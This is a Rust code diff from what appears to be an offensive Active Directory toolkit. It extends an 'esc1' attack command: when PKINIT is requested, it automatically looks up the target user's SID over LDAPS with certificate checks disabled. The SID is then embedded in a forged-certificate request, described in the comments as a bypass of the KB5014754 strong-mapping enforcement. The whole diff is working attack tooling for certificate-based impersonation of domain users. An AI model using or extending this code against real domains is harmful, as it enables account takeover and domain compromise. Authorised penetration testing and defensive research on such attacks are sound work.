@@ -91,16 +91,42 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
     use smb2_client::SmbClient;
 
     let subject = a.upn.split('@').next().unwrap_or("adhammer");
-    let csr =
-        adhammer_kerberos::csr::build_csr_with_sid_ext(subject, Some(&a.upn), a.sid.as_deref())?;
+    // KB5014754 auto-resolve: when the operator wants to PKINIT with the issued cert but did
+    // not pass --sid, look the target's objectSid up over LDAPS-636 (--insecure — lab friendly)
+    // via the collector. Soft-fail: if the lookup errors, keep going without the SID extension
+    // so pre-KB5014754 DCs still enroll — the run-end brief will name the KB5014754 outcome.
+    let resolved_sid: Option<String> = if a.sid.is_some() {
+        a.sid.clone()
+    } else if a.pkinit {
+        match auto_resolve_target_sid(&a, subject).await {
+            Ok(sid) => {
+                eprintln!("[*] auto-resolved --sid={sid} for {subject} (KB5014754 bypass)");
+                Some(sid)
+            }
+            Err(e) => {
+                eprintln!(
+                    "[!] auto-resolve of --sid failed ({e}); the issued cert will NOT carry \
+                     the KB5014754 strong-mapping extension. Pass --sid <SID> explicitly if \
+                     PKINIT fails with error_code 66."
+                );
+                None
+            }
+        }
+    } else {
+        None
+    };
+    let csr = adhammer_kerberos::csr::build_csr_with_sid_ext(
+        subject,
+        Some(&a.upn),
+        resolved_sid.as_deref(),
+    )?;
     let key_path = format!("{}.key.pem", a.out);
     adhammer_core::write_secret_artifact(
         std::path::Path::new(&key_path),
         adhammer_core::SecretArtifact::PrivateKey,
         csr.key_pem.as_bytes(),
     )?;
-    let sid_note = a
-        .sid
+    let sid_note = resolved_sid
         .as_deref()
         .map(|s| format!(", SID-ext={s} (KB5014754)"))
         .unwrap_or_default();
@@ -222,4 +248,25 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
         );
     }
     Ok(())
+}
+
+/// KB5014754 auto-resolve helper: look up the target user's objectSid over LDAPS so `attack esc1
+/// --pkinit` "just works" against Full-Enforcement KDCs without the operator having to hand-copy
+/// a SID. Best-effort: any failure (unresolvable host, LDAPS-hardened DC, wrong credentials)
+/// falls back to a soft-warn in the caller — the operator can still pass `--sid <SID>` explicitly.
+async fn auto_resolve_target_sid(a: &Esc1Args, target_sam: &str) -> anyhow::Result<String> {
+    use adhammer_collector::{Collector, LdapConfig};
+    let url = format!("ldaps://{}:636", a.auth.host);
+    let cfg = LdapConfig {
+        url,
+        bind_dn: a.auth.user.clone(),
+        password: a.auth.password.clone(),
+        base_dn: None,
+        insecure: true, // lab friendly — match esc1's --insecure UX
+        gssapi: false,
+        allow_plaintext_bind: false,
+    };
+    let mut c = Collector::connect(&cfg).await?;
+    let sid = c.resolve_sid(target_sam).await?;
+    Ok(sid.to_string())
 }
